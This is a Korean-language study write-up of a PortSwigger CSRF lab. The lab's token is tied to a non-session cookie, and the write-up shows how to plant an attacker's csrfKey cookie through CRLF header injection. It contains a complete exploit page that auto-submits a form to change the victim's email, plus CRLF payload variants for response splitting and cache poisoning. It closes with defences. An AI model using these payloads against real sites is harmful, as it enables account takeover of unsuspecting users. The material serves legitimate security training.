# Lab: CSRF where token is tied to non-session cookie

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Request Forgery (CSRF) — Double Submit Cookie / 세션 비연결 csrfKey / CRLF 인젝션 쿠키 주입
- **링크**: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie

## 목표

서버가 CSRF 토큰을 세션이 아닌 별도 `csrfKey` 쿠키와 대조 검증하는 허점에서, CRLF 인젝션(`\r\n`)으로 피해자 브라우저에 공격자의 `csrfKey` 쿠키를 심어 이메일을 변경한다.

## 서버의 검증 방식 — Double Submit Cookie 패턴

```
정상 요청:
  Cookie: session=VICTIM_SESSION; csrfKey=KEY_A
  Body:   email=victim@email.com&csrf=TOKEN_A

서버 검증:
  csrf(body) ↔ csrfKey(cookie) 값이 대응하는 쌍인가?
  → 일치하면 처리

[취약점]
  csrfKey 와 csrf 토큰은 서로 연결됨
  그러나 둘 다 세션(session 쿠키)과는 연결되지 않음
  → 공격자가 자신의 csrfKey + csrf 쌍을 피해자 요청에 사용 가능
```

## 공격 흐름

```
[준비] 공격자 계정에서:
  1. 로그인 → csrfKey=ATTACKER_KEY, csrf=ATTACKER_TOKEN 획득
  2. 두 값의 쌍을 기록해 둠

[문제] csrfKey 쿠키를 피해자 브라우저에 심어야 함
  → 피해자의 쿠키는 공격자가 직접 설정 불가
  → CRLF 인젝션으로 서버 응답에 Set-Cookie 헤더 추가

[CRLF 인젝션 경로 탐색]
  검색 파라미터가 응답 헤더에 반영됨 발견:
  GET /?search=test
  → 응답: Set-Cookie: LastSearchTerm=test

  → search 에 \r\n 을 삽입하면 추가 헤더 주입 가능!

[피해자 공격 실행]
  1. img src 로 CRLF 인젝션 요청 → csrfKey 쿠키 피해자 브라우저에 설정
  2. onerror 로 폼 자동 제출 (쿠키 설정 완료 후)
  3. 피해자 세션 + 공격자 csrfKey + 공격자 csrf 토큰 → 서버 검증 통과
  4. 이메일 변경
```

## CRLF 인젝션 상세

### HTTP 헤더의 구조

```
HTTP/1.1 200 OK\r\n
Content-Type: text/html\r\n
Set-Cookie: LastSearchTerm=test\r\n
\r\n
[응답 본문]
```

HTTP 헤더는 `\r\n`(CR LF)으로 구분된다.  
파라미터 값에 `\r\n` 을 삽입하면 새 헤더 줄을 추가할 수 있다.

### CRLF 인젝션 페이로드

```
GET /?search=test%0d%0aSet-Cookie:+csrfKey=ATTACKER_KEY

URL 디코딩:
  search=test\r\nSet-Cookie: csrfKey=ATTACKER_KEY
```

서버 응답 (인젝션 후):

```
HTTP/1.1 200 OK\r\n
Content-Type: text/html\r\n
Set-Cookie: LastSearchTerm=test\r\n
Set-Cookie: csrfKey=ATTACKER_KEY\r\n   ← 주입된 헤더!
\r\n
[응답 본문]
```

브라우저: `csrfKey=ATTACKER_KEY` 쿠키를 취약 사이트 도메인으로 설정.

## 최종 페이로드 (exploit server 에 호스팅)

```html
<html>
  <body>
    <!-- 1단계: CRLF 인젝션으로 csrfKey 쿠키 설정 -->
    <img src="https://VULNERABLE.com/?search=test%0d%0aSet-Cookie:+csrfKey=ATTACKER_KEY;%20SameSite=None"
         onerror="document.forms[0].submit()">

    <!-- 2단계: csrfKey 설정 완료 후 onerror 로 폼 제출 -->
    <form action="https://VULNERABLE.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
      <input type="hidden" name="csrf" value="ATTACKER_TOKEN">
    </form>
  </body>
</html>
```

### 실행 순서

```
1. img src 로드 요청:
   GET https://VULNERABLE.com/?search=test%0d%0aSet-Cookie:+csrfKey=ATTACKER_KEY

2. 서버 응답에 Set-Cookie: csrfKey=ATTACKER_KEY 포함
   → 피해자 브라우저에 csrfKey 쿠키 설정

3. 응답이 이미지가 아님 → onerror 발화
   → document.forms[0].submit() 실행

4. POST 요청 전송:
   Cookie: session=VICTIM_SESSION; csrfKey=ATTACKER_KEY  ← 혼합!
   Body:   email=attacker@evil.com&csrf=ATTACKER_TOKEN

5. 서버 검증:
   csrf(ATTACKER_TOKEN) ↔ csrfKey(ATTACKER_KEY) → 일치!
   → 검증 통과 → 피해자 이메일 변경
```

## 이전 랩들과의 비교

| 랩 | 취약점 | 우회 방법 |
|----|--------|---------|
| 004 | 토큰 전역 풀 (세션 미연결) | 공격자 토큰을 그대로 사용 |
| 005 (이번) | csrfKey 쿠키가 세션 미연결 | CRLF 로 csrfKey 쿠키 주입 후 사용 |

## 핵심 정리

- Double Submit Cookie 패턴에서 쿠키(csrfKey)와 토큰(csrf)이 세션과 연결되지 않으면, 공격자의 쌍을 피해자 요청에 사용할 수 있다.
- CRLF 인젝션(`%0d%0a`)으로 서버 응답 헤더에 `Set-Cookie` 를 주입해 피해자 브라우저의 쿠키를 제어할 수 있다.
- `img onerror` 패턴은 "쿠키 설정 완료 후 폼 제출" 의 순서를 보장하는 데 사용된다.
- **방어**:
  - CSRF 토큰을 세션과 직접 연결 (Double Submit Cookie 패턴 지양)
  - 응답 헤더에 사용자 입력을 반영할 때 `\r\n` 등 헤더 구분자 필터링
  - `SameSite=Strict` 쿠키로 외부 요청 시 모든 쿠키 미전송

## 배운 점 및 추가 학습

### 1. CRLF 인젝션 (`\r\n`) 완전 이해

```
CR  = Carriage Return = \r = %0d = ASCII 13
LF  = Line Feed       = \n = %0a = ASCII 10
CRLF = \r\n = %0d%0a

HTTP/1.1 스펙: 헤더 줄 구분자는 CRLF
  → 값에 CRLF 를 삽입하면 새 헤더 줄 시작

공격 가능한 헤더 반영 위치:
  Location: https://example.com/USER_INPUT   ← 리다이렉트
  Set-Cookie: name=USER_INPUT                ← 쿠키 값
  Content-Disposition: filename=USER_INPUT   ← 파일명

인젝션 결과:
  Location: https://example.com/test\r\n
  X-Injected: evil\r\n                       ← 새 헤더 주입
  \r\n                                       ← 헤더 종료 후 응답 본문 조작 가능
  <script>alert(1)</script>                  ← HTTP Response Splitting
```

### 2. CRLF 인젝션 공격 유형

```
[1] 쿠키 주입 (이번 랩)
  ?search=x%0d%0aSet-Cookie:+csrfKey=evil
  → 피해자 브라우저에 쿠키 설정

[2] 헤더 추가
  ?redirect=https://example.com%0d%0aX-Forwarded-For:+127.0.0.1
  → 서버 로직에 영향

[3] HTTP Response Splitting
  ?param=value%0d%0a%0d%0a<html>악성콘텐츠</html>
  → \r\n\r\n 으로 헤더 완전 종료 후 응답 본문 조작
  → XSS, 캐시 포이즈닝 등 2차 공격

[4] 캐시 포이즈닝
  → 중간 캐시 서버가 조작된 응답을 저장
  → 다른 사용자에게 악성 응답 제공
```

### 3. `img onerror` — 순차 실행 보장 패턴

```javascript
// 문제: 쿠키를 설정하고 나서 폼을 제출해야 함
// 순서가 바뀌면 쿠키 없이 폼 제출 → 실패

// 잘못된 방법 (순서 보장 안 됨)
fetch('/?search=...%0d%0aSet-Cookie:+csrfKey=KEY')  // 비동기
document.forms[0].submit()  // 쿠키 설정 전에 실행될 수 있음

// 올바른 방법 1: img onerror (이번 랩)
<img src="/?search=...CRLF_INJECTION..."
     onerror="document.forms[0].submit()">
// 이미지 로드(= 쿠키 설정 요청) 완료 후 onerror 발화 → 순서 보장

// 올바른 방법 2: fetch().then()
fetch('/?search=...CRLF_INJECTION...')
  .then(() => document.forms[0].submit())
```

### 4. Double Submit Cookie 패턴 — 올바른 구현 vs 취약한 구현

```
[취약한 구현 — 이번 랩]
  서버: csrf(body) == csrfKey(cookie) ?
  문제: 두 값이 세션과 무관 → 공격자가 자신의 쌍 사용 가능

[올바른 구현 1 — 세션 기반 토큰]
  서버: csrf(body) == session['csrf_token'] ?
  → 세션과 직접 연결 → 다른 세션 토큰 사용 불가

[올바른 구현 2 — HMAC 서명 쿠키]
  csrfKey = HMAC(session_id, secret_key)
  csrf_token = csrfKey  (동일 값)
  → 서버: HMAC 재계산으로 쿠키 위변조 탐지
  → 공격자가 session_id 없이는 유효한 csrfKey 생성 불가
```

### 5. SameSite 쿠키의 CRLF 인젝션 방어

```
Set-Cookie: csrfKey=KEY; SameSite=Strict

SameSite=Strict:
  외부 사이트(evil.com)에서 오는 요청에 쿠키 미전송
  → img src 로 CRLF 인젝션 쿠키를 심어도
  → 폼 제출(cross-site) 시 csrfKey 쿠키 안 붙음
  → 공격 실패

단, 주입 자체는 막지 못함 (쿠키는 심어짐)
단지 외부 요청에 전송 안 될 뿐
→ SameSite + CSRF 토큰 세션 연결 조합이 이상적
```
